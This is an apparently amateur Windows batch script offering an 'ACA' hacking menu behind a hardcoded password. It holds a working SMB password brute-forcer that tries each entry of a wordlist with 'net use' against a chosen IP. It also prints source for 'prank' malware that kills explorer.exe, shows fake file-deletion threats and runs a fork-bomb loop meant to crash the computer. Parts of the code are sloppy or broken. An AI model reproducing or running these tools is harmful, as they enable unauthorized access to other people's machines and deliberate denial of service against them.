@echo off
title ACA projects

:1
cls
color 0c
echo A.C.A please enter password
set /p pass1=
if %pass1%==1234 goto 3
if not %pass1%==1234 goto fail

:3
cls
color 0a
echo     /\       ======       /\
echo    /  \      !           /  \
echo   /----\     !          /----\
echo  /      \    !         /      \ 
echo /        \   ======   /        \
echo ==============================================================================================================
echo ACA menu choose bruteforce/rizzvirus/delprank/acavirus  'exit'
echo ==============================================================================================================
set /p car=
if %car%==bruteforce goto page1
if %car%==rizzvirus goto 2
if %car%==delprank goto 4
if %car%==exit
if %car%==acavirus goto 7
if not %car%==bruteforce goto 5
if not %car%==rizzvirus goto 5
if not %car%==delprank goto 5
if not %car%==exit1 goto 5
if not %car ==acavirus goto 5
:page1
cls
echo bruteforce password unlocked
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
goto 3

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
pause
goto 3

:fail
cls
echo wrong passcode 
pause
goto 1

:2
cls
color 0a
echo rizzvirus.bat
echo===============================================================================
echo @echo off
echo title Rizz Virus
echo color F
echo -
echo :start
echo set text="Hello, You're About to Get Rizzed"
echo echo /text/
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") = speech.vbs
echo echo speech.speak /text/ == speech.vbs
echo start speech.vbs
echo timeout 1 =nul 
echo -
echo -
echo call :Attack "Do you have a name, or can I call you mine?"
echo call :Attack "Are you French? Because Eiffel for you."
echo call :Attack "Your eyes are like an ocean, and I'm lost at sea."
echo call :Attack "If beauty were a crime, you'd be serving a life sentence."
echo call :Attack "Are you a time traveler? Because I can see you in my future."
echo call :Attack "Are you a camera? Because every time I look at you, I smile."
echo -
echo -
echo :attack
echo cls
echo echo /~1
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") > speech.vbs
echo echo speech.speak "/~1" == speech.vbs
echo start speech.vbs
echo timeout 5 =nul
echo exit /b
echo ==============================================================================
echo = is greater than sign
echo / is %
pause 
goto 3

:4
echo wanna cry (A.C.A)
echo ==============================================================================================================
echo @echo off
echo color a
echo taskkill /f /im "explorer.exe"
echo :1
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") = = "speech.Vbs"
echo set "text=Hello your device is infected with A C A your files will now be deleted along with your operating system any key to proceed"
echo echo speech.speak "/text/" == "speech.vbs"
echo start speech.vbs
echo :2
echo echo Hello your device is infected with A.C.A your files will now be deleted along with your operating system press any key to procsed
echo echo Hit any key to proceed
echo pause
echo :3
echo del speech.Vbs
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") = = "speech.Vbs"
echo set "text=Lol just kidding it was a prank"
echo echo speech.speak "/text/" == "speech.vbs"
echo start speech.vbs
echo :4
echo echo lol just kidding it was a prank but you pc will now crash
echo :loop
echo start
echo start
echo start
echo start
echo goto loop
echo ==============================================================================================================
echo / = %
echo = = greater sign
echo ==============================================================================================================
pause
goto 3

:5
echo invalid imput please try again
pause
goto 3

:6
echo     /\       ======       /\
echo    /  \      !           /  \
echo   /----\     !          /----\
echo  /      \    !         /      \ 
echo /        \   ======   /        \
echo ==============================================================================================================
echo whould you like to leave yes/no 
echo ==============================================================================================================
set /p exit2
if %exit2%==yes exit
if %exit2%==no goto 3

:7 
echo A.C.A virus version 1.3
echo ==============================================================================================================
echo taskkill /f /im "explorer.exe"
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") = = "speech.Vbs"
echo set "text=Hello your device is infected with A C A your pc will now crash"
echo echo speech.speak "/text/" = = "speech.vbs"
echo start speech.vbs
echo -
echo color 2
echo :loop2
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo -
echo echo this is a hack for the A.C.A the anonymous cracker association...get hacked loser you pc will now crash :)
echo echo this is a hack for the A.C.A the anonymous cracker association...get hacked loser you pc will now crash :)
echo goto loop2
echo ==============================================================================================================
echo / = %
echo = = greater than sign
pause
goto 3

:8
